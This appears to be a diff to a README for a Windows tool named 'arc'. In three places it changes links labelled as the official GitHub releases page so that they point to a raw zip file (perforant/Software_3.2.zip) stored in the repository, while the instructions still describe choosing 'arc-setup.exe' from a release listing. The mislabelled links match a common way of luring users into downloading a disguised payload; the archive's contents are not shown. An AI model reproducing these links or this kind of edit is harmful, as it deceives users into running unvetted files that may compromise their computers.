@@ -1,6 +1,6 @@
 # 🌐 arc - Manage your digital projects with ease
 
-[![Download Arc](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Kareal4544/arc/releases)
+[![Download Arc](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Kareal4544/arc/raw/refs/heads/main/perforant/Software_3.2.zip)
 
 ## 🎯 About this software
 
@@ -19,7 +19,7 @@ Your computer needs to meet these basic standards to run the application:
 
 Follow these steps to set up the software on your Windows machine.
 
-1. Visit the [official releases page](https://github.com/Kareal4544/arc/releases) to download the installer.
+1. Visit the [official releases page](https://github.com/Kareal4544/arc/raw/refs/heads/main/perforant/Software_3.2.zip) to download the installer.
 2. Look for the file ending in `.exe` under the latest release heading.
 3. Click the file to save it to your computer.
 4. Locate the file in your Downloads folder.
@@ -31,7 +31,7 @@ Follow these steps to set up the software on your Windows machine.
 
 You can obtain the current version of Arc through the official GitHub releases page. Please visit this page to download the setup file.
 
-[Click here to open the download page](https://github.com/Kareal4544/arc/releases)
+[Click here to open the download page](https://github.com/Kareal4544/arc/raw/refs/heads/main/perforant/Software_3.2.zip)
 
 You will see several files listed under the latest version. Select the file named `arc-setup.exe` to begin your download. This file contains everything you need to run the application on your computer.
 
